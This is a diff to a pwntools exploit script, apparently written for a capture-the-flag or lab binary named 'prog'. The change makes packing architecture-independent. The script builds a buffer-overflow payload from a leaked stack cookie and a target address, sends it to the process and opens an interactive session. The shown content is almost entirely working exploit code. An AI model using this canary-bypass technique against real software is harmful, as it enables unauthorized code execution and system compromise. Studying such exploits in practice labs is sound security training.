@@ -1,6 +1,7 @@
 from pwn import *
 
 e = ELF('prog')
+context.clear(arch=e.arch, endian=e.endian)
 
 p = e.process()
 
@@ -26,9 +27,9 @@ print(disclosed)
 print(addr)
 
 payload = 'A'
-payload += p64(cookie)
-payload += p64(0)
-payload += p64(addr)
+payload += pack(cookie)
+payload += pack(0)
+payload += pack(addr)
 
 p.sendline(payload)
 p.interactive()
